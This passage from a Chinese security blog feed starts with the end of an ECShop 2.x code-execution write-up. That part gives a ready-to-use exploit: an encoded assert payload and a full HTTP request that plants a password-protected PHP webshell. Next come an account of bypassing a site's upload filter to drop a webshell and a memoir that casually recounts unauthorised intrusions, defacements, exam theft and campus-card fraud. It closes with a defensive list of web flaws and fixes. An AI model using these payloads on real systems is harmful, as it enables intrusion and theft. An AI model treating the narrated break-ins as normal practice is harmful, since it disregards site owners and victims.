src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/20.jpg" alt="ecshop2.x代码执行"></p><p>最后这里引入单引号从变量中逃逸</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/21.jpg" alt="ecshop2.x代码执行"></p><p>我们要闭合_var所以最终payload是</p><pre><code class="hljs php">&#123;<span class="hljs-variable">$asd</span><span class="hljs-string">&#x27;];assert(base64_decode(&#x27;</span>ZmlsZV9wdXRfY29udGVudHMoJzEudHh0JywnZ2V0c2hlbGwnKQ==<span class="hljs-string">&#x27;));//&#125;xxx</span></code></pre><p>会在网站跟目录生成1.txt 里面内容是getshell</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180902_ecshop2.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/22.jpg" alt="ecshop2.x代码执行"></p><p>GETSHELL exp:</p><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/user.php?act=login</span> HTTP/1.1<span class="hljs-attribute">Host</span>: 127.0.0.1<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3<span class="hljs-attribute">Cookie</span>: PHPSESSID=9odrkfn7munb3vfksdhldob2d0; ECS_ID=1255e244738135e418b742b1c9a60f5486aa4559; ECS[visit_times]=1<span class="hljs-attribute">Referer</span>: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:&quot;num&quot;;s:280:&quot;*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -&quot;;s:2:&quot;id&quot;;s:3:&quot;&#x27;/*&quot;;&#125;<span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1<span class="hljs-attribute">Cache-Control</span>: max-age=0</code></pre><p>会在网站根目录生成1.php 密码是1337</p><p>文章转载自:<br><a href="http://ringk3y.com/2018/08/31/ecshop2-x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">http://ringk3y.com/2018/08/31/ecshop2-x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>Ecshop</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一个奇葩的上传点</title>
    <link href="/p/7819b580.html"/>
    <url>/p/7819b580.html</url>
    
    <content type="html"><![CDATA[<p>最近一直很忙，V老哥发来一个站，说有一个上传点，问我要不要玩玩，当时太忙，就没去看，等过了几个小时以后，他说还没有突破，然后我叫他把后台和帐号密码发给我试试。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/01.jpg" alt="记一个奇葩的上传点"></p><p>先打开后台看看，发现后台还是挺炫酷的。</p><a id="more"></a><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/02.jpg" alt="记一个奇葩的上传点"></p><p>用帐号密码登录进后台，找到了上传的地方。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/03.jpg" alt="记一个奇葩的上传点"></p><p>打开burp，创建一个1.mp4文件，里面写phpinfo代码，然后发送到Repeater模块，点击go，可以发现是能够正常上传的。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/04.jpg" alt="记一个奇葩的上传点"></p><p>继续做测试，把文件名改成1.php;mp4</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/05.jpg" alt="记一个奇葩的上传点"></p><p>然后访问一下该页面，发现显示的是源码。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/06.jpg" alt="记一个奇葩的上传点"></p><p>接下来上传了一个1.rar;mp4。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/07.jpg" alt="记一个奇葩的上传点"></p><p>访问以后是下载该文件，正常人到这一步都会怀疑可能存在解析漏洞，但是该文件夹下面没有脚本执行权限。</p><p>接下来把文件名改成1.php试了下，发现上传回显还是mp4格式。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/08.jpg" alt="记一个奇葩的上传点"></p><p>陷入了沉思当中，仔细的看了数据包中的每一个参数，发现Cookie有点猫腻。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/09.jpg" alt="记一个奇葩的上传点"></p><p>于是我把php删除了，然后奇迹发生了。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/10.jpg" alt="记一个奇葩的上传点"></p><p>我访问看看，发现可以正常访问的。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/11.jpg" alt="记一个奇葩的上传点"></p><p>于是很激动的发给V哥这个地址，但是他却打不开。。。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/12.jpg" alt="记一个奇葩的上传点"></p><p>至于是什么原因应该是跟那个改了的Cookie有关，最后传了个马上去。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20180822_%E8%AE%B0%E4%B8%80%E4%B8%AA%E5%A5%87%E8%91%A9%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%82%B9/13.jpg" alt="记一个奇葩的上传点"></p><p>后面的就不写了，我把马丢给V哥以后就不管事了。</p>]]></content>
    
    
    <categories>
      
      <category>原创文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透实战</tag>
      
      <tag>原创文章</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>七年，当我们成为别人的背影时，我们失去了多少</title>
    <link href="/p/fe9c9fcd.html"/>
    <url>/p/fe9c9fcd.html</url>
    
    <content type="html"><![CDATA[<p>嗯，一个文笔菜如老狗的我，我想写点什么，各位看官看看就好。</p><p>今年20出头，我相信大家入这行大多数都是从刷钻还有帐号被盗开始，我也不例外。<br>记得读初三的时候，开始接触刷钻，那个时候都是用手机卡刷钻。读到高一的时候，也就是那个时候开始，算是刚接触这行吧。<br>那个时候找了个师傅，好像花了50。。。。不过那时候学生党没有多少钱。当时学刷宽带钻，还有什么入侵啥的，反正当时觉得特别牛逼。<br>还有什么入侵三字经，慢慢的发现，叫他教技术总是各种敷衍，后来知道了他是骗子以后，就把我拉黑了。当时为了刷宽带钻，抓鸡而买了一台服务器。</p><a id="more"></a><p>记得那个时候，学习的地方叫做黑基，然后加了群，认识了一个群主叫小风的，还记得有个叫罪叔叔的，总是开玩笑的说卖河南大饼。不过，现在都没联系了。<br>在黑基里面，学过哪些东西我不记得了，只记得当时学什么UBB排版吧，当时写了一个QQ空间的登录页面，那时候读高一，网上认识的一个朋友和我说学习html吧，他也算是我的启蒙老师吧，反正那个时候不会的我都会问他。<br>不记得怎么接触渗透的了，记得有一次，用网上的什么0day，进了别人的后台，好像是个什么新闻的。发现首页有太多日本的字眼，然后我把首页改了，留了自己的ID和QQ号（那时候不懂事，勿喷），那个时候ID好像还叫灰灰（是以前的女朋友起的，现在想起来都觉得我这种大叔类型的人，为啥会用这个ID）。。。。<br>后来上课的时候接到一个电话，是那个网站站长打给我的，问我是不是灰灰，说我在他网站上面留下了QQ号，然后我吓得说了一句你打错了，我在上课，就挂了。<br>当时突然想拿自己的高中学校网站练手，好像就是那个时候认识了土司论坛的恋安，也就是你们说的xuehei大佬，现在想想，和他认识可能也快有5年了，也许更久吧。<br>我当时因为太菜，搞高中学校网站搞不下，然后叫恋安帮我，恋安说了一句从来没见过这么丑的网站。网站是学校老师自己用aspx写的。<br>嗯，老版的网站始终没搞下，现在网站也改新的了。<br>高中毕业后，163邮箱裤子出来了，之前查过学校的域名，是163邮箱注册的，然后用一个网站查到了密码，随手去后台地址试了试，登录成功。<br>起码拿到了学校网站的后台权限，至于shell吧，凡科建站，我是真的无奈。</p><p>由于高中全部在折腾这方面的，学习直接没学，高考考了211，是分数，不是学校。进了一所二流的专科， 大一的时候，选了计算机网络技术，至于html和c语言啥的，我高中就学完了，现在什么都不记得了，反正直接考了个计算机二级C，没屁用的证书。<br>大一的时候，参加了叫赣安杯的比赛，一个人带着两个大二的学长。预赛是做题，当时太菜了，勉勉强强进了决赛。<br>在决赛的时候被老师坑了一波，他告诉我不用带电脑，比赛方会提供的，所以我们三个人就带了一台电脑去，是一个学长的，上面什么都没。在决赛被打得很惨。<br>不过很庆幸，在决赛上认识了vking和另一个老哥（这里不知道ID，不提名字了）。只记得当时v哥台式机都带去了。<br>大一第一次期末考试，莫名的慌，听说考不好会挂科，高考数学29的我，看到高数就头疼。<br>一次偶然的机会，帮教务处的主任装系统，知道了考试卷放在哪台电脑上，后来我神不知鬼不觉的把所有工程系的试卷和答案偷了出来。。。（考卷是随机抽的，最后考了经管系的试卷，只有专业课考了自己老师出的）</p><p>后来看到碧哥破解学校的水卡，至于碧哥，后面再说吧。我当时也买了NFC设备，自己花了一个月的时间算一卡通的加密算法，一卡通有三个功能，吃饭，打水和洗澡。发现卡的数据是存放在卡里的，而且没有任何信息登记。当时去充卡的地方问那个人说我卡掉了，能不能帮我查下有没有人捡到我的卡用我的钱，那个人问我知不知道卡号，我说用名字不能查吗，他说办卡的时候没登记任何信息。我就走了，然后就你们懂的。。。。</p><p>后来考驾照，土豆找我说他要日他们驾校，然后我们一起拿到了服务器权限，后来我也搞了学校驾校一波，但是不知道为什么没有太多妹子信息。</p><p>记得有一次搞一个妹子的学校，拿到了内网权限，当时ms17-010刚出来，我全家桶都搬到服务器上去了，打算慢慢玩。后来，勒索病毒爆发，管理员加班几天，网站入口关了，因为没留后门，导致权限丢失。现在那妹子是我女朋友了。</p><p>记得小时候说过会把小学毕业照挂到学校的网站首页上，刚开始太菜，拿不下。后来我做到了，本来打算挂首页一天，第二天会恢复，后来想想，让黑页留在根目录下吧，也算是怀念下自己的童年。现在网站域名到期了，昨晚看了下被其他学校注册了。。。。</p><p>故事太多，文笔太烂，不知道怎么说，当初认识了渗透吧吧主，当时把我拉进了一个叫大风车的小群。<br>在群里认识了很多人，虽然没学到什么，但是大家都很开心的聊天。<br>但是，现在，进去的进去了，失踪的失踪了。发生了太多了。</p><p>从当初在动车上看到的广告网站我都会动手，到现在看到网站都会苦笑。我真的变了。</p><p>现在也毕业了，前几天刚谈转正工资，3k5。这么多年来，就值3k5，打算撤了。<br>也许会继续做这行，也许会离开这行。<br>这些年失去太多了，真的累了。</p>]]></content>
    
    
    <categories>
      
      <category>胡思乱想</category>
      
    </categories>
    
    
    <tags>
      
      <tag>生活</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>web漏洞合集描述和修复建议</title>
    <link href="/p/83a0ea04.html"/>
    <url>/p/83a0ea04.html</url>
    
    <content type="html"><![CDATA[<div class="note note-success">            <p>人生几何，对酒当歌！</p>          </div><p><code>内容均来自互联网，风险等级根据实际情况定义</code></p><h2 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>当Web应用程序未对用户输入的数据进行足够的安全处理（如危险字符过滤或者语句过滤），而直接拼接SQL语句执行时，攻击者可以精心构造参数值，使服务器执行非预期的SQL语句并返回结果，造成数据库信息泄露。利用SQL注入漏洞，攻击者可获取数据库的增、删、改、查权限，甚至执行系统命令，上传后门文件等。</p><a id="more"></a><p><strong>加固建议：</strong><br>针对SQL注入漏洞，需要对网站所有参数中提交的数据进行过滤，禁止输入”‘“、”xor”、”or”、”–”、”#”、”select”、”and”等特殊字符；所有的查询语句都使用数据库提供的参数化查询接口，SQL语句使用参数化处理后的数据作为输入,而不是将用户输入变量嵌入到SQL语句中；严格限制网站用户对数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害；避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者收集这些错误信息进行判断进而执行SQL注入攻击。</p><h2 id="XSS跨站脚本漏洞"><a href="#XSS跨站脚本漏洞" class="headerlink" title="XSS跨站脚本漏洞"></a>XSS跨站脚本漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>跨站脚本攻击是通过在网页中加入恶意代码，当访问者浏览网页时恶意代码会被执行，攻击者可利用该漏洞窃取或操纵客户会话和 cookie，用来模仿合法用户，从而使攻击者获得管理员权限，控制整个网站。<br><strong>加固建议：</strong><br>1.在cookie中设置了HttpOnly属性，那么通过JavaScript脚本将无法读取到cookie信息，这样能一定程度上防止XSS攻击。<br>2.假定所有输入都是可疑的，必须对所有输入中的script、iframe等字样进行严格的检查。这里的输入不仅仅是用户可以直接交互的输入接口，也包括HTTP请求中的cookie中的变量，HTTP请求头部中的变量等。<br>3.不仅验证数据的类型，还要验证其格式、长度、范围和内容。<br>4.过滤“&lt;” 、“&gt;” 将用户输入放入引号间，基本实现数据与代码隔离；过滤双引号防止用户跨越许可的标记，添加自定义标记；过滤TAB和空格,防止关键字被拆分；过滤script关键字；过滤&amp;#,防止HTML属性绕过检查。在客户端和服务器端同时做数据的验证与过滤。<br>5.对输出的数据也要检查，数据库里的值有可能会在一个大网站的多处都有输出，即使在输入做了编码等操作，在各处的输出点时也要进行安全检查。</p><h2 id="CRLF注入漏洞"><a href="#CRLF注入漏洞" class="headerlink" title="CRLF注入漏洞"></a>CRLF注入漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>CRLF是”回车 + 换行”（\r\n）的简称。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。HRS是比XSS危害更大的安全问题。<br><strong>加固建议：</strong><br>针对CRLF注入漏洞，建议过滤\r 、\n等特殊字符，避免输入的数据污染到其他HTTP头。</p><h2 id="URL重定向钓鱼"><a href="#URL重定向钓鱼" class="headerlink" title="URL重定向钓鱼"></a>URL重定向钓鱼</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>通过构建URL，攻击者可以使用户重定向到任意URL，利用这个漏洞可以诱使用户访问某个页面，挂马、密码记录、下载任意文件等，常被用来钓鱼。<br><strong>加固建议：</strong><br>1.referer的限制<br>如果确定传递URL参数进入的来源，可以通过该方式实现安全限制，保证该URL的有效性，避免恶意用户自己生成跳转链接。<br>2.加入有效性验证Token<br>保证所有生成的链接都是来自于可信域的，通过在生成的链接里加入用户不可控的Token对生成的链接进行校验，可以避免用户生成自己的恶意链接从而被利用。<br>3.URL白名单，在白名单内才进行跳转</p><h2 id="Host头攻击漏洞"><a href="#Host头攻击漏洞" class="headerlink" title="Host头攻击漏洞"></a>Host头攻击漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>对开发人员来说，提取请求头中的Host参数写入当前页面是一个很不明智的选择。因为如果这样，攻击者就可以通过修改HTTP请求头中的Host字段，控制服务器返回页面中的URL。<br><strong>加固建议：</strong><br>不允许读取Host字段并写入页面。如有需要，应使用服务器脚本自带的SERVER_NAME变量。</p><h2 id="框架注入漏洞"><a href="#框架注入漏洞" class="headerlink" title="框架注入漏洞"></a>框架注入漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>攻击者有可能注入含有恶意内容的 frame 或 iframe 标签。如果用户不够谨慎，就有可能浏览该标签所对应的页面，但意识不到自己会离开原始站点而进入恶意的站点。之后，攻击者便可以诱导用户再次登录，然后获取其登录凭证。<br><strong>加固建议：</strong><br>建议过滤以下所有字符：| &amp; ； $ % @ ‘ “ &#39; &quot; &lt;&gt; () + CR LF , \。</p><h2 id="CSRF跨站请求伪造漏洞（HTML表单没有CSRF保护）"><a href="#CSRF跨站请求伪造漏洞（HTML表单没有CSRF保护）" class="headerlink" title="CSRF跨站请求伪造漏洞（HTML表单没有CSRF保护）"></a>CSRF跨站请求伪造漏洞（HTML表单没有CSRF保护）</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>攻击者可利用该漏洞模仿合法用户，从而使攻击者能够以该用户身份查看或变更用户记录以及执行事务。<br><strong>加固建议：</strong><br>1.使用验证码<br>使用验证码，那么每次操作都需要用户进行互动，可简单有效的防御CSRF攻击。<br>2.检测referer<br>通过检查Referer的值，我们就可以判断这个请求是合法的还是非法的<br>3.增加一个随机的token值<br>添加一个参数Token，其值是随机的。这样攻击者因为不知道Token而无法构造出合法的请求进行攻击。</p><h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>验证上传文件的程序没有对上传文件作任何过滤，导致可以上传任意文件到服务器，甚至是病毒文件和木马文件。<br><strong>加固建议：</strong><br>对于上传的附件，验证程序要做严格验证，使用服务器端校验，而不能仅用前端javascript验证。<br>1.建议严格限制上传文件类型和上传文件名及后缀。<br>2.检查文件头和文件内容，对上传文件目录的运行权限进行严格限制。<br>3.及时排查、删除服务器木马文件。</p><h2 id="本地文件包含漏洞"><a href="#本地文件包含漏洞" class="headerlink" title="本地文件包含漏洞"></a>本地文件包含漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>由于程序员未对用户可控的变量进行输入检查，导致用户可以控制被包含的文件，成功利用时可以使web server将特定文件当成脚本执行，从而导致攻击者可获取一定的服务器权限；或直接读取系统文件，造成服务器敏感信息泄露。<br><strong>加固建议：</strong><br>针对文件包含漏洞，建议采用“白名单”的方式，限制允许包含的文件范围。</p><h2 id="远程文件包含漏洞"><a href="#远程文件包含漏洞" class="headerlink" title="远程文件包含漏洞"></a>远程文件包含漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>服务器通过语言的特性（函数）去包含任意文件时，由于要包含的这个文件来源过滤不严格，从而可以去包含一个恶意文件，攻击者就可以远程构造一个特定的恶意文件达到攻击目的。<br><strong>加固建议：</strong><br>如果一定要动态包含文件，建议最好明确规定包含哪些文件，进行白名单比对。同时，也可以在包含函数中加入目录限制。</p><h2 id="SSRF（服务端请求伪造）"><a href="#SSRF（服务端请求伪造）" class="headerlink" title="SSRF（服务端请求伪造）"></a>SSRF（服务端请求伪造）</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>很多web应用都提供了从其他的服务器上获取数据的功能。使用用户指定的URL，web应用可以获取图片，下载文件，读取文件内容等。这个功能如果被恶意使用，可以利用存在缺陷的web应用作为代理攻击远程和本地的服务器，探测内网信息甚至内网入侵。<br><strong>加固建议：</strong><br>SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。建议对url参数值做严格的限制。</p><h2 id="任意文件读取漏洞"><a href="#任意文件读取漏洞" class="headerlink" title="任意文件读取漏洞"></a>任意文件读取漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>程序过滤不严，导致可以通过../../../等方式跳转到其他目录读取任意文件。<br><strong>加固建议：</strong><br>1.过滤”../”的特殊字符<br>2.限制读取文件的目录，不允许跨目录读取</p><h2 id="任意文件下载漏洞"><a href="#任意文件下载漏洞" class="headerlink" title="任意文件下载漏洞"></a>任意文件下载漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>在正常下载链接的文件参数前加 ../../../../ 来跳出目录限制，下载系统文件等任意文件。该漏洞是由于后台代码未对下载路径做安全限制引起的。<br><strong>加固建议：</strong><br>针对任意文件下载漏洞，建议严格限制文件下载路径。</p><h2 id="Struts2-dev-mod命令执行漏洞"><a href="#Struts2-dev-mod命令执行漏洞" class="headerlink" title="Struts2 dev-mod命令执行漏洞"></a>Struts2 dev-mod命令执行漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>网站封装采用Apache Struts xwork作为网站应用框架，且devMode为打开状态。当这个设置开启时，Struts2会提供更多的日志和调试信息来帮助开发者更快速的开发。<br>然而在开发者模式下，将允许OGNL语句注入，攻击者可能利用此漏洞进行远程代码执行。<br><strong>加固建议：</strong><br>1.升级最新版本；<br>2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。</p><h2 id="S2-005命令执行漏洞"><a href="#S2-005命令执行漏洞" class="headerlink" title="S2-005命令执行漏洞"></a>S2-005命令执行漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>OGNL除其他功能外，还提供了广泛的表达评估功能。该漏洞允许恶意用户绕过构建在ParametersInterceptor中的“＃” - 使用保护，从而能够利用此漏洞进行远程代码执行。<br><strong>加固建议：</strong><br>1.升级最新版本；<br>2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。</p><h2 id="S2-009命令执行漏洞"><a href="#S2-009命令执行漏洞" class="headerlink" title="S2-009命令执行漏洞"></a>S2-009命令执行漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>OGNL除其他功能外，还提供广泛的表达评估功能。该漏洞允许恶意用户绕过构建到ParametersInterceptor中的所有保护（正则表达式模式，拒绝方法调用），从而能够在任何公开的字符串变量中注入恶意表达式以进一步评估。<br>S2-003和S2-005中已经解决了类似的行为，但事实证明，基于白名单可接受的参数名称所产生的修复只是部分地关闭了漏洞。<br>正则表达式在ParametersInterceptor中匹配top [‘foo’]（0）作为一个有效的表达式，OGNL把它视为（top [‘foo’]）（0）并且将’foo’动作参数的值作为OGNL表达式来计算。这使得恶意用户可以将任意的OGNL语句放入任何由操作暴露的字符串变量中，并将其作为OGNL表达式进行求值，并且由于OGNL语句在HTTP参数值中，攻击者可以使用黑名单字符（例如＃）禁用方法执行并执行任意方法绕过了ParametersInterceptor和OGNL库的保护。<br><strong>加固建议：</strong><br>1.升级最新版本；<br>2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。</p><h2 id="S2-016命令执行漏洞"><a href="#S2-016命令执行漏洞" class="headerlink" title="S2-016命令执行漏洞"></a>S2-016命令执行漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>在struts2中，DefaultActionMapper类支持以”action:”、”#ff0000irect:”、”#ff0000irectAction:”作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令。<br><strong>加固建议：</strong><br>1.升级最新版本；<br>2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。</p><h2 id="S2-017URL跳转漏洞"><a href="#S2-017URL跳转漏洞" class="headerlink" title="S2-017URL跳转漏洞"></a>S2-017URL跳转漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>在2.3.15.1之前的Struts 2中，“#ff0000irect：”或“#ff0000irectAction：”之后的信息可以很容易地被操纵，以重定向到任意位置。<br><strong>加固建议：</strong><br>1.升级最新版本；<br>2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。</p><h2 id="S2-019命令执行漏洞"><a href="#S2-019命令执行漏洞" class="headerlink" title="S2-019命令执行漏洞"></a>S2-019命令执行漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>Struts2的操作映射机制支持特殊参数前缀操作，这可能会在表格底部附加引导信息，在映射 “action:” 前缀操作时存在安全绕过漏洞，可被攻击者利用绕过某些安全限制访问受限制功能。Struts2的Dynamic Method Invocation机制是默认开启的（仅提醒用户如果可能的情况下关闭此机制）这样就存在远程代码执行漏洞，攻击者可利用此漏洞在受影响应用上下文中执行任意代码。<br><strong>加固建议：</strong><br>1.升级最新版本；<br>2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。</p><h2 id="S2-032命令执行漏洞"><a href="#S2-032命令执行漏洞" class="headerlink" title="S2-032命令执行漏洞"></a>S2-032命令执行漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>动态方法调用启用时，可能会传递一个恶意表达式，用于在服务器端执行任意代码。<br><strong>加固建议：</strong><br>1.升级最新版本；<br>2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。</p><h2 id="S2-037命令执行漏洞"><a href="#S2-037命令执行漏洞" class="headerlink" title="S2-037命令执行漏洞"></a>S2-037命令执行漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>Struts2使用Rest插件之后，ActionMapping通过org.apache.struts2.rest.RestActionMapper.java类的publicActionMappinggetMapping(HttpServl etRequest request,ConfigurationManagerconfigManager)的方法获取的。其中，当请求url是如下的格式：actionName/id/methodName会获取methodName 作为ActionMapping的method属性。但method属性未做任何处理，同S2-032漏洞执行流程一致，都是将ActionMapping的属性设置到ActionProxy中，从ActionProxy中获取method属性带入到ognl表达式中执行，通过OGNL表达式静态调用获取ognl.OgnlContext的DEFAULT_MEMBER_ACCESS属性并覆盖_memberAccess的方式进行绕过，进而可在受控制的服务器端执行任意代码。即攻击者在部署了REST插件的Struts 